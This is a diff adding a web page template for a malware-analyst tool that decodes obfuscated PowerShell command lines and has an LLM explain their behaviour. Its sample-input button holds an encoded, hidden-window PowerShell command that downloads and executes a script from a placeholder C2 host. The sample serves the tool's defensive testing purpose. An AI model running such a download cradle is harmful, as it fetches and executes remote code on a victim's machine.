@@ -1,0 +1,78 @@
+{{define "content"}}
+{{$d := .Data}}
+<div class="page-header">
+  <div>
+    <h1 class="page-title">분석가 보조 (Analyst Assist Workbench)</h1>
+    <p class="page-subtitle">난독화·인코딩된 PowerShell 및 셸 명령줄을 결정적으로 디코딩한 뒤 OpenAI LLM이 행위를 해석합니다</p>
+  </div>
+</div>
+
+<div class="callout callout-info">
+  <div>
+    <div style="font-weight:700;margin-bottom:2px;">외부 API 전송 및 민감정보 마스킹 안내</div>
+    <div>분석 요청 시 OpenAI API(HTTPS)로 전송되며, 설정된 민감 필드(<span class="mono">user, host, email</span>)는 토큰 치환 마스킹 후 복원됩니다.</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-header">
+    <div>
+      <h2 class="card-title">의심 명령줄 입력</h2>
+      <div class="card-subtitle">Base64 UTF-16LE, 다중 인코딩, 난독화 문자열을 자동으로 계층 디코딩합니다</div>
+    </div>
+  </div>
+  <div class="card-body">
+    <div class="form-label">샘플 페이로드</div>
+    <div class="chip-row">
+      <button type="button" class="chip-btn" data-fill-target="assist-cmd-input" data-fill-value="powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AbQBhAGwAaQBjAGkAbwB1AHMALgB4AHkAegAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA">인코딩 PowerShell C2 다운로더 예시</button>
+    </div>
+    <form method="POST" action="/assist/analyze" onsubmit="var b=this.querySelector('button[type=submit]');b.disabled=true;b.textContent='디코딩 및 AI 해석 중...';">
+      <div class="form-group">
+        <textarea id="assist-cmd-input" name="command" class="form-control mono" rows="4" required placeholder="예: powershell.exe -ExecutionPolicy Bypass -enc ...">{{$d.Command}}</textarea>
+      </div>
+      <button type="submit" class="btn btn-primary">디코딩 및 AI 행동 해석 실행</button>
+    </form>
+  </div>
+</div>
+
+{{if $d.HasResult}}
+<div class="grid-2">
+  <div class="card">
+    <div class="card-header"><h2 class="card-title">1. 원본 입력 명령줄</h2></div>
+    <div class="card-body">
+      <pre class="code-block">{{$d.Result.Deobfuscated.OriginalText}}</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div>
+        <h2 class="card-title">2. 결정적 디코딩 결과</h2>
+        <div class="card-subtitle">디코딩 계층: {{$d.Result.Deobfuscated.LayersDecoded}}단계</div>
+      </div>
+    </div>
+    <div class="card-body">
+      {{if $d.Result.Deobfuscated.Highlights}}
+      <div style="margin-bottom:10px;display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
+        <span class="text-muted" style="font-size:12px;">탐지 위험 토큰:</span>
+        {{range $d.Result.Deobfuscated.Highlights}}<span class="pill pill-critical">{{.}}</span>{{end}}
+      </div>
+      {{end}}
+      <pre class="code-block">{{$d.Result.Deobfuscated.DecodedText}}</pre>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-header">
+    <div>
+      <h2 class="card-title">3. AI 행동 해석 리포트</h2>
+      <div class="card-subtitle">모든 문장은 [확인] · [추정] · [미확인] 근거 태깅 규격을 준수합니다 (Model: {{$d.Result.Model}})</div>
+    </div>
+  </div>
+  <div class="card-body">
+    {{renderMarkdown $d.Result.Analysis}}
+  </div>
+</div>
+{{end}}
+{{end}}
